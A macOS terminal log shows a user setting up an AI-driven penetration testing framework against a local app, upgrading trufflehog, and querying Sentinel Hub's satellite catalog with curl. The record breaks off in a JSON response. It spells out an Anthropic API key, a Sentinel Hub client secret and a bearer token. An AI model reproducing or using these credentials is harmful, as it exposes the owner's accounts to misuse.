Last login: Wed Mar  4 10:10:23 on ttys008

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
(base) Anands-MacBook-Air:~ anandva$ pwd
/Users/anandva
(base) Anands-MacBook-Air:~ anandva$ cd shannon/
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./
.claude/                   .github/                   CLAUDE.md                  docker-compose.yml         mcp-server/                README.md                  SHANNON-PRO.md
.dockerignore              .gitignore                 configs/                   Dockerfile                 package-lock.json          repos/                     src/
.env.example               assets/                    COVERAGE.md                EOBrowser/                 package.json               sample-reports/            tsconfig.json
.git/                      audit-logs/                docker-compose.docker.yml  LICENSE                    prompts/                   shannon                    xben-benchmark-results/
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./
.claude/                   .github/                   CLAUDE.md                  docker-compose.yml         mcp-server/                README.md                  SHANNON-PRO.md
.dockerignore              .gitignore                 configs/                   Dockerfile                 package-lock.json          repos/                     src/
.env.example               assets/                    COVERAGE.md                EOBrowser/                 package.json               sample-reports/            tsconfig.json
.git/                      audit-logs/                docker-compose.docker.yml  LICENSE                    prompts/                   shannon                    xben-benchmark-results/
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./EOBrowser/
ERROR: Set ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN in .env
       (or use CLAUDE_CODE_USE_BEDROCK=1 for AWS Bedrock,
        CLAUDE_CODE_USE_VERTEX=1 for Google Vertex AI,
        or ROUTER=true with OPENAI_API_KEY or OPENROUTER_API_KEY)
(base) Anands-MacBook-Air:shannon anandva$ cat > .env << 'EOF'
> ANTHROPIC_API_KEY=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
> CLAUDE_CODE_MAX_OUTPUT_TOKENS=64000
> 
> 
> 
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./EOBrowser/
ERROR: Set ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN in .env
       (or use CLAUDE_CODE_USE_BEDROCK=1 for AWS Bedrock,
        CLAUDE_CODE_USE_VERTEX=1 for Google Vertex AI,
        or ROUTER=true with OPENAI_API_KEY or OPENROUTER_API_KEY)
(base) Anands-MacBook-Air:shannon anandva$ cat > .env << 'EOF'
> ANTHROPIC_API_KEY=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
> CLAUDE_CODE_MAX_OUTPUT_TOKENS=64000
> EOF
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./EOBrowser/
ERROR: Repository not found at ./repos/./EOBrowser/

Place your target repository under the ./repos/ directory
(base) Anands-MacBook-Air:shannon anandva$ ls
assets				COVERAGE.md			EOBrowser			package.json			sample-reports			tsconfig.json
audit-logs			docker-compose.docker.yml	LICENSE				prompts				shannon				xben-benchmark-results
CLAUDE.md			docker-compose.yml		mcp-server			README.md			SHANNON-PRO.md
configs				Dockerfile			package-lock.json		repos				src
(base) Anands-MacBook-Air:shannon anandva$ mv EOBrowser repos/
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:300 REPO=./EOBrowser/
Starting Shannon containers...
unable to get image 'shannon-worker': Cannot connect to the Docker daemon at unix:///Users/anandva/.docker/run/docker.sock. Is the docker daemon running?
(base) Anands-MacBook-Air:shannon anandva$ docker
Usage:  docker [OPTIONS] COMMAND

A self-sufficient runtime for containers

Common Commands:
  run         Create and run a new container from an image
  exec        Execute a command in a running container
  ps          List containers
  build       Build an image from a Dockerfile
  bake        Build from a file
  pull        Download an image from a registry
  push        Upload an image to a registry
  images      List images
  login       Authenticate to a registry
  logout      Log out from a registry
  search      Search Docker Hub for images
  version     Show the Docker version information
  info        Display system-wide information

Management Commands:
  ai*         Docker AI Agent - Ask Gordon
  builder     Manage builds
  buildx*     Docker Buildx
  cloud*      Docker Cloud
  compose*    Docker Compose
  container   Manage containers
  context     Manage contexts
  debug*      Get a shell into any image or container
  desktop*    Docker Desktop commands
  extension*  Manages Docker extensions
  image       Manage images
  init*       Creates Docker-related starter files for your project
  manifest    Manage Docker image manifests and manifest lists
  mcp*        Docker MCP Plugin
  model*      Docker Model Runner
  network     Manage networks
  plugin      Manage plugins
  sbom*       View the packaged-based Software Bill Of Materials (SBOM) for an image
  scout*      Docker Scout
  system      Manage Docker
  trust       Manage trust on Docker images
  volume      Manage volumes

Swarm Commands:
  swarm       Manage Swarm

Commands:
  attach      Attach local standard input, output, and error streams to a running container
  commit      Create a new image from a container's changes
  cp          Copy files/folders between a container and the local filesystem
  create      Create a new container
  diff        Inspect changes to files or directories on a container's filesystem
  events      Get real time events from the server
  export      Export a container's filesystem as a tar archive
  history     Show the history of an image
  import      Import the contents from a tarball to create a filesystem image
  inspect     Return low-level information on Docker objects
  kill        Kill one or more running containers
  load        Load an image from a tar archive or STDIN
  logs        Fetch the logs of a container
  pause       Pause all processes within one or more containers
  port        List port mappings or a specific mapping for the container
  rename      Rename a container
  restart     Restart one or more containers
  rm          Remove one or more containers
  rmi         Remove one or more images
  save        Save one or more images to a tar archive (streamed to STDOUT by default)
  start       Start one or more stopped containers
  stats       Display a live stream of container(s) resource usage statistics
  stop        Stop one or more running containers
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE
  top         Display the running processes of a container
  unpause     Unpause all processes within one or more containers
  update      Update configuration of one or more containers
  wait        Block until one or more containers stop, then print their exit codes

Global Options:
      --config string      Location of client config files (default "/Users/anandva/.docker")
  -c, --context string     Name of the context to use to connect to the daemon (overrides DOCKER_HOST env var and default context set with "docker context use")
  -D, --debug              Enable debug mode
  -H, --host list          Daemon socket to connect to
  -l, --log-level string   Set the logging level ("debug", "info", "warn", "error", "fatal") (default "info")
      --tls                Use TLS; implied by --tlsverify
      --tlscacert string   Trust certs signed only by this CA (default "/Users/anandva/.docker/ca.pem")
      --tlscert string     Path to TLS certificate file (default "/Users/anandva/.docker/cert.pem")
      --tlskey string      Path to TLS key file (default "/Users/anandva/.docker/key.pem")
      --tlsverify          Use TLS and verify the remote
  -v, --version            Print version information and quit

Run 'docker COMMAND --help' for more information on a command.

For more help on how to use Docker, head to https://docs.docker.com/go/guides/
(base) Anands-MacBook-Air:shannon anandva$ ./shannon start URL=http://localhost:3000 REPO=EOBrowser
Starting Shannon containers...
[+] Running 5/5
 ✔ temporal Pulled                                                                                                                                                                                       15.0s 
   ✔ d8ad8cd72600 Pull complete                                                                                                                                                                           0.7s 
   ✔ 959a610cbdbf Pull complete                                                                                                                                                                           8.1s 
   ✔ 99070ab0cc8d Pull complete                                                                                                                                                                           1.2s 
   ✔ b8d1e520aef0 Pull complete                                                                                                                                                                           2.5s 
Compose can now delegate builds to bake for better performance.
 To do so, set COMPOSE_BAKE=true.
[+] Building 1022.5s (30/30) FINISHED                                                                                                                                                     docker:desktop-linux
 => [worker internal] load build definition from Dockerfile                                                                                                                                               0.0s
 => => transferring dockerfile: 4.47kB                                                                                                                                                                    0.0s
 => [worker internal] load metadata for cgr.dev/chainguard/wolfi-base:latest                                                                                                                              3.4s
 => [worker internal] load .dockerignore                                                                                                                                                                  0.0s
 => => transferring context: 702B                                                                                                                                                                         0.0s
 => [worker builder 1/6] FROM cgr.dev/chainguard/wolfi-base:latest@sha256:00f9662b838432de5f24eabe5dc86f20d1510d158eda1bcaf68bbba8412544cc                                                                3.2s
 => => resolve cgr.dev/chainguard/wolfi-base:latest@sha256:00f9662b838432de5f24eabe5dc86f20d1510d158eda1bcaf68bbba8412544cc                                                                               0.0s
 => => sha256:7286a66ed918fb1407827ed50228de615bf1be10078d7352c405cbf84201d9fa 13.82kB / 13.82kB                                                                                                          0.7s
 => => sha256:0432f8c5292aae6ee0aeb70b674097d6ad92c1cc4083b2b736c04e75b9ca5fac 11.79kB / 11.79kB                                                                                                          0.7s
 => => sha256:9f197b8c84b9f7d999614447540adae0e3212ce58a76d61c34d9076549efcece 2.88kB / 2.88kB                                                                                                            0.8s
 => => sha256:2ffcaa5eef4ce687e1faa8ff7fc922b9548cd985fab1da4649406229115b537b 52.14kB / 52.14kB                                                                                                          0.8s
 => => sha256:ac4e0893667fd0789b078cd06cb46a338c27cc8bc106530e19f6304644b0a833 76.99kB / 76.99kB                                                                                                          0.6s
 => => sha256:d59129664e6258e646bb3d32a2119cb307c2e4c7b9a2f140cfea28c86479bb80 97.57kB / 97.57kB                                                                                                          0.8s
 => => sha256:58258abbd6ee202520c029dce611653674e849615d729900983964f7158d5c34 132.03kB / 132.03kB                                                                                                        0.8s
 => => sha256:476e178de2a6247739f8294e68a4ebc30e11ac6ec3e8c4f2106cb641ed862e87 171.02kB / 171.02kB                                                                                                        0.8s
 => => sha256:78e6465d299bcae4e2ce1f3277591c8950d1cd1edc958ecb7a56d171ee718ca9 420.17kB / 420.17kB                                                                                                        0.7s
 => => sha256:f8559a4a52e3bfac45796d5884ce69f19f06e8f27e543229c8f23188a0bb66c5 2.42MB / 2.42MB                                                                                                            0.7s
 => => sha256:f8c70f64240ef71ca16b8fe8bf87d5f385061de483a0c0492104ae4a9911d197 2.66MB / 2.66MB                                                                                                            1.0s
 => => extracting sha256:f8c70f64240ef71ca16b8fe8bf87d5f385061de483a0c0492104ae4a9911d197                                                                                                                 0.1s
 => => extracting sha256:f8559a4a52e3bfac45796d5884ce69f19f06e8f27e543229c8f23188a0bb66c5                                                                                                                 0.0s
 => => extracting sha256:78e6465d299bcae4e2ce1f3277591c8950d1cd1edc958ecb7a56d171ee718ca9                                                                                                                 0.0s
 => => extracting sha256:476e178de2a6247739f8294e68a4ebc30e11ac6ec3e8c4f2106cb641ed862e87                                                                                                                 0.0s
 => => extracting sha256:58258abbd6ee202520c029dce611653674e849615d729900983964f7158d5c34                                                                                                                 0.0s
 => => extracting sha256:d59129664e6258e646bb3d32a2119cb307c2e4c7b9a2f140cfea28c86479bb80                                                                                                                 0.0s
 => => extracting sha256:ac4e0893667fd0789b078cd06cb46a338c27cc8bc106530e19f6304644b0a833                                                                                                                 0.0s
 => => extracting sha256:2ffcaa5eef4ce687e1faa8ff7fc922b9548cd985fab1da4649406229115b537b                                                                                                                 0.0s
 => => extracting sha256:0432f8c5292aae6ee0aeb70b674097d6ad92c1cc4083b2b736c04e75b9ca5fac                                                                                                                 0.0s
 => => extracting sha256:9f197b8c84b9f7d999614447540adae0e3212ce58a76d61c34d9076549efcece                                                                                                                 0.0s
 => => extracting sha256:7286a66ed918fb1407827ed50228de615bf1be10078d7352c405cbf84201d9fa                                                                                                                 0.0s
 => [worker internal] load build context                                                                                                                                                                 18.7s
 => => transferring context: 738.36MB                                                                                                                                                                    18.4s
 => [worker builder 2/6] RUN apk update && apk add --no-cache     build-base     git     curl     wget     ca-certificates     libpcap-dev     linux-headers     go     nodejs-22     npm     python3   118.3s
 => [worker runtime  2/19] RUN apk update && apk add --no-cache     git     bash     curl     ca-certificates     libpcap     nmap     nodejs-22     npm     python3     ruby     chromium     nss      325.2s
 => [worker builder 3/6] RUN mkdir -p /go/bin                                                                                                                                                             1.3s
 => [worker builder 4/6] RUN go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest                                                                                                104.0s
 => [worker builder 5/6] RUN git clone --depth 1 https://github.com/urbanadventurer/WhatWeb.git /opt/whatweb &&     chmod +x /opt/whatweb/whatweb &&     gem install addressable &&     echo '#!/bin/ba  24.7s
 => [worker builder 6/6] RUN pip3 install --no-cache-dir schemathesis                                                                                                                                    59.1s
 => [worker runtime  3/19] COPY --from=builder /go/bin/subfinder /usr/local/bin/                                                                                                                          3.3s 
 => [worker runtime  4/19] COPY --from=builder /opt/whatweb /opt/whatweb                                                                                                                                  1.5s 
 => [worker runtime  5/19] COPY --from=builder /usr/local/bin/whatweb /usr/local/bin/whatweb                                                                                                              0.1s 
 => [worker runtime  6/19] RUN gem install addressable                                                                                                                                                   13.4s 
 => [worker runtime  7/19] COPY --from=builder /usr/lib/python3.*/site-packages /usr/lib/python3.12/site-packages                                                                                         4.4s 
 => [worker runtime  8/19] COPY --from=builder /usr/bin/schemathesis /usr/bin/                                                                                                                            2.4s 
 => [worker runtime  9/19] RUN addgroup -g 1001 pentest &&     adduser -u 1001 -G pentest -s /bin/bash -D pentest                                                                                         4.1s 
 => [worker runtime 10/19] WORKDIR /app                                                                                                                                                                   0.1s 
 => [worker runtime 11/19] COPY package*.json ./                                                                                                                                                          4.1s 
 => [worker runtime 12/19] COPY mcp-server/package*.json ./mcp-server/                                                                                                                                    0.1s 
 => [worker runtime 13/19] RUN npm ci &&     cd mcp-server && npm ci && cd .. &&     npm cache clean --force                                                                                             48.7s 
 => [worker runtime 14/19] COPY . .                                                                                                                                                                     122.9s 
 => [worker runtime 15/19] RUN cd mcp-server && npm run build && cd .. && npm run build                                                                                                                  34.2s 
 => [worker runtime 16/19] RUN npm prune --production &&     cd mcp-server && npm prune --production                                                                                                     15.0s 
 => [worker runtime 17/19] RUN npm install -g @anthropic-ai/claude-code                                                                                                                                   4.5s 
 => [worker runtime 18/19] RUN mkdir -p /app/sessions /app/deliverables /app/repos /app/configs &&     mkdir -p /tmp/.cache /tmp/.config /tmp/.npm &&     chmod 777 /app &&     chmod 777 /tmp/.cache   217.9s 
 => [worker runtime 19/19] RUN git config --global user.email "agent@localhost" &&     git config --global user.name "Pentest Agent" &&     git config --global --add safe.directory '*'                  2.2s 
 => [worker] exporting to image                                                                                                                                                                         200.8s 
 => => exporting layers                                                                                                                                                                                 116.8s 
 => => exporting manifest sha256:970683e927d77b798ed487b2b03504143a7e259e9ad18fa0a1f9993017536c30                                                                                                         0.0s 
 => => exporting config sha256:57409621387fc5d1cd29ebe7d341f112a16d10f7e773d62c7cf4ff5eac9acc95                                                                                                           0.0s
 => => naming to docker.io/library/shannon-worker:latest                                                                                                                                                  0.0s
 => => unpacking to docker.io/library/shannon-worker:latest                                                                                                                                              82.7s
 => [worker] resolving provenance for metadata file                                                                                                                                                       0.4s
[+] Running 5/5
 ✔ worker                          Built                                                                                                                                                                  0.0s 
 ✔ Network shannon_default         Created                                                                                                                                                                0.4s 
 ✔ Volume "shannon_temporal-data"  Created                                                                                                                                                                0.1s 
 ✔ Container shannon-temporal-1    Healthy                                                                                                                                                                7.3s 
 ✔ Container shannon-worker-1      Started                                                                                                                                                                6.8s 
Waiting for Temporal to be ready...
Temporal is ready!

   ╔═════════════════════════════════════════════════════════════════════╗
   ║                                                                     ║
   ║   ███████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗ ██████╗ ███╗   ██╗   ║
   ║   ██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔═══██╗████╗  ██║   ║
   ║   ███████╗███████║███████║██╔██╗ ██║██╔██╗ ██║██║   ██║██╔██╗ ██║   ║
   ║   ╚════██║██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██║   ██║██║╚██╗██║   ║
   ║   ███████║██║  ██║██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝██║ ╚████║   ║
   ║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ║
   ║                                                                     ║
   ║                                                                     ║
   ║                    ╔════════════════════════════════════╗           ║
   ║                    ║  AI Penetration Testing Framework  ║           ║
   ║                    ╚════════════════════════════════════╝           ║
   ║                                                                     ║
   ║                               v1.0.0                                ║
   ║                                                                     ║
   ║                         🔐 DEFENSIVE SECURITY ONLY 🔐               ║
   ║                                                                     ║
   ║                                                                     ║
   ╚═════════════════════════════════════════════════════════════════════╝

✓ Systems initialized.        

Connecting to Temporal at temporal:7233...
✓ Workflow started: localhost_shannon-1772782101773

  Target:     http://localhost:3000
  Repository: /repos/EOBrowser
  Workspace:  localhost_shannon-1772782101773

Monitor progress:
  Web UI:  http://localhost:8233/namespaces/default/workflows/localhost_shannon-1772782101773
  Logs:    ./shannon logs ID=localhost_shannon-1772782101773

Output:
  Reports: ./audit-logs/localhost_shannon-1772782101773

(base) Anands-MacBook-Air:shannon anandva$ trufflehog -v
trufflehog: error: unknown short flag '-v', try --help
(base) Anands-MacBook-Air:shannon anandva$ trufflehog -V
trufflehog: error: unknown short flag '-V', try --help
(base) Anands-MacBook-Air:shannon anandva$ trufflehog --version
trufflehog 3.92.5
(base) Anands-MacBook-Air:shannon anandva$ brew update trufflehog
Error: This command updates brew itself, and does not take formula names.
Use `brew upgrade trufflehog` instead.
(base) Anands-MacBook-Air:shannon anandva$ brew upgrade trufflehog
==> Auto-updating Homebrew...
Adjust how often this is run with `$HOMEBREW_AUTO_UPDATE_SECS` or disable with
`$HOMEBREW_NO_AUTO_UPDATE=1`. Hide these hints with `$HOMEBREW_NO_ENV_HINTS=1` (see `man brew`).
==> Auto-updated Homebrew!
Updated 4 taps (trufflesecurity/trufflehog, hashicorp/tap, homebrew/core and homebrew/cask).
==> New Formulae
apkeep: Command-line tool for downloading APK files from various sources
atuin-server: Sync server for atuin - Improved shell history for zsh, bash, fish and nushell
betterleaks: Secrets scanner built for configurability and speed
checkpwn: Check Have I Been Pwned and see if it's time for you to change passwords
cloudflare-speed-cli: Cloudflare-based speed test with optional TUI
cni-plugins: Container Network Interface plugins
containerd: Open and reliable container runtime
dlpack: Common in-memory tensor structure
docker-engine: Pack, ship and run any application as a lightweight container (Daemon)
flowrs: TUI application for Apache Airflow
git-pkgs: Track package dependencies across git history
gittype: CLI code-typing game that turns your source code into typing challenges
googleworkspace-cli: CLI for Drive, Gmail, Calendar, Sheets, Docs, Chat, Admin, and more
kubectl-tree: Kubectl plugin to browse Kubernetes object hierarchies as a tree
landrun: Lightweight, secure sandbox for running Linux processes using Landlock LSM
lua@5.4: Powerful, lightweight programming language
mkbrr: Is a tool to create, modify and inspect torrent files. Fast
models: Fast TUI and CLI for browsing AI models, benchmarks, and coding agents
mp4ff: Tools for parsing and manipulating MP4/ISOBMFF files
openspec: Spec-driven development (SDD) for AI coding assistants
pet: Simple command-line snippet manager
protobuf@33: Protocol buffers (Google's data interchange format)
rootlesskit: Linux-native "fake root" for implementing rootless containers
runc: CLI tool for spawning and running containers according to the OCI specification
rustypaste-cli: CLI tool for rustypaste
skills: Open agent skills ecosystem
spicedb: Open Source, Google Zanzibar-inspired database
termframe: Terminal output SVG screenshot tool
termusic: Music Player TUI written in Rust
torf-cli: CLI tool for creating, reading and editing torrent files
vapoursynth-bestsource: Audio/video source and FFmpeg wrapper
vuls: Agentless Vulnerability Scanner for Linux/FreeBSD
x-cli: Command-line power tool for Twitter
==> New Casks
bettercapture: Screen recorder
cmux: Ghostty-based terminal with vertical tabs and notifications for AI coding agents
connectiq-sdk-manager: Manage SDKs and download device definitions for Garmin Connect IQ development
fabric-app: Personal knowledge management and note-taking app
font-datatype
font-ghanachocolate
font-gmarket-sans
font-iosevka-charon
font-iosevka-charon-mono
font-miranda-sans
itsytv: Menu bar app for controlling your Apple TV
kotlin-lsp: Official Kotlin Language Server
ltx-desktop: Desktop app for generating videos with LTX models
paseo: Self-hosted daemon for AI coding agents
spokenly: Dictation and transcription app with AI-powered editing
t3-code: Minimal GUI for AI code agents
tablepro: Native database client for MySQL, PostgreSQL, SQLite, and MongoDB
vcmi: Open-source engine for Heroes of Might & Magic III

You have 56 outdated formulae and 1 outdated cask installed.

==> Upgrading 1 outdated package:
trufflehog 3.92.5 -> 3.93.7
==> Fetching downloads for: trufflehog
✔︎ Bottle trufflehog (3.93.7)                                                                                                                                                        Downloaded   33.2MB/ 33.2MB
==> Upgrading trufflehog
  3.92.5 -> 3.93.7 
==> Pouring trufflehog--3.93.7.arm64_tahoe.bottle.tar.gz
Error: The `brew link` step did not complete successfully
The formula built, but is not symlinked into /opt/homebrew
Could not symlink bin/trufflehog
Target /opt/homebrew/bin/trufflehog
already exists. You may want to remove it:
  rm '/opt/homebrew/bin/trufflehog'

To force the link and overwrite all conflicting files:
  brew link --overwrite trufflehog

To list all files that would be deleted:
  brew link --overwrite trufflehog --dry-run

Possible conflicting files are:
/opt/homebrew/bin/trufflehog
==> Summary
🍺  /opt/homebrew/Cellar/trufflehog/3.93.7: 6 files, 115.8MB
==> Running `brew cleanup trufflehog`...
Disable this behaviour by setting `HOMEBREW_NO_INSTALL_CLEANUP=1`.
Hide these hints with `HOMEBREW_NO_ENV_HINTS=1` (see `man brew`).
Removing: /opt/homebrew/Cellar/trufflehog/3.92.5... (6 files, 113.5MB)
Removing: /Users/anandva/Library/Caches/Homebrew/trufflehog_bottle_manifest--3.92.5... (7.5KB)
Removing: /Users/anandva/Library/Caches/Homebrew/trufflehog--3.92.5... (32.5MB)
(base) Anands-MacBook-Air:shannon anandva$ trufflehog --version
trufflehog 3.92.5
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token" \
>  -H "Content-Type: application/x-www-form-urlencoded" \
>  -d "grant_type=client_credentials" \
>  -d "client_id=YOUR_CLIENT_ID" \
>  -d "client_secret=YOUR_CLIENT_SECRET"
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token" \
>  -H "Content-Type: application/x-www-form-urlencoded" \
>  -d "grant_type=client_credentials" \
>  -d "client_id=116eecdd-ff1b-47f6-8592-f68f0ea6d810" \
>  -d "client_secret=TeTqh5HIAaqAx4VimmsyiYf8nUSjBVS9"
{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA","expires_in":3600,"refresh_expires_in":0,"token_type":"Bearer","not-before-policy":0,"scope":"email profile"}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/api/v1/catalog/1.0.0/search" \
>  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMwNTU0MDMsImlhdCI6MTc3MzA1MTgwMywianRpIjoiZThjZDQ5Y2YtYTVjMi00NWRlLWIzZmYtNTJjYzhkNGI5NzAyIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiI0OS4zNy4xNjEuMjAyIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJwbF9wcm9qZWN0IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LTExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsImNsaWVudEFkZHJlc3MiOiI0OS4zNy4xNjEuMjAyIiwiYWNjb3VudCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInBsX3dvcmtzcGFjZSI6IjhhZjlmYzI1LTkyYTMtNDk4Mi05ZmFkLWY5MjI2YWIxZjE2NCIsImNsaWVudF9pZCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCJ9.CpCxTT_NcYF1_y2M7ZVS4mf6BTHAf4Al388LP3Wht46t_gsIzek6EYcQmKswes430uYL52FBKbMQ1zE9OEYjErL1DJDeSYDuI7M8wg_fDuSM6hsVCxC3MhkBS0L6Jw1XlDEWsc3Htl6QDIYNdP3IY9ASdemvHJEpXQi2GEMneFNLCir9TsGM3tjDh6LmWNRlZWWU31DZ6MRiWOXxWocJSqsYMwQaVyNCMhPIOycWdgAJRlRx6uawOcR6FnovXVlMZZelNew7fpavVGk4DVCl5dwiYk_0SuMqhwvVxztNZQHoZe_yVAWcJEdHCzAyFcj6qcaGnI_MyGE53P3z5R0yaA" \
>  -H "Content-Type: application/json" \
>  -d '{
>     "bbox": [13.2, 45.3, 13.5, 45.6],
>     "datetime": "2024-01-01T00:00:00Z/2024-01-31T23:59:59Z",
>     "collections": ["sentinel-2-l2a"],
>     "limit": 5
>   }'
{"type":"FeatureCollection","features":[{"stac_version":"1.0.0","stac_extensions":["https://stac-extensions.github.io/eo/v1.0.0/schema.json","https://stac-extensions.github.io/projection/v1.0.0/schema.json"],"id":"S2B_MSIL2A_20240130T100149_N0510_R122_T33TUL_20240130T112430","type":"Feature","geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:OGC::CRS84"}},"coordinates":[[[[12.508026365820161,46.026390735044565],[12.42660680926262,45.79433291635989],[12.460798077329557,45.037032390528786],[13.854352586282992,45.05952247124274],[13.834095356164024,46.04761849125311],[12.508026365820161,46.026390735044565]]]]},"bbox":[12.42660680926262,45.037032390528786,13.854352586282992,46.04761849125311],"properties":{"datetime":"2024-01-30T10:08:08Z","platform":"sentinel-2b","instruments":["msi"],"constellation":"sentinel-2","gsd":10,"eo:cloud_cover":0.06,"proj:epsg":32633,"proj:bbox":[300000.0,4990200.0,409800.0,5100000.0],"proj:geometry":{"type":"MultiPolygon","crs":{"type":"name","properties":{"name":"urn:ogc:def:crs:EPSG::32633"}},"coordinates":[[[[307134.5744898395,5099999.000171174],[300000.99987363094,5074417.575494238],[300000.99988546676,4990201.000146128],[409798.99999955244,4990201.000147356],[409798.9999994927,5099999.000172377],[307134.5744898395,5099999.000171174]]]]}},"assets":{"data":{"href":"s3://sentinel-s2-l2a/tiles/33/T/UL/2024/1/30/0/","title":"s3","type":"inode/directory"}},"collection":"sentinel-2-l2a","links":[{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/","rel":"root","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a/items/S2B_MSIL2A_20240130T100149_N0510_R122_T33TUL_20240130T112430","rel":"self","type":"application/geo+json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"parent","type":"application/json"},{"href":"https://services.sentinel-hub.com/api/v1/catalog/1.0.0/collections/sentinel-2-l2a","rel":"collection","type":"application/json"},{"href":"https://scihub.copernicus.eu/dhus/odata/v1/Products('bec35327-2590-41a5-8ab8-420a3dcd794d')/$value","rel":"derived_from","title":"scihub 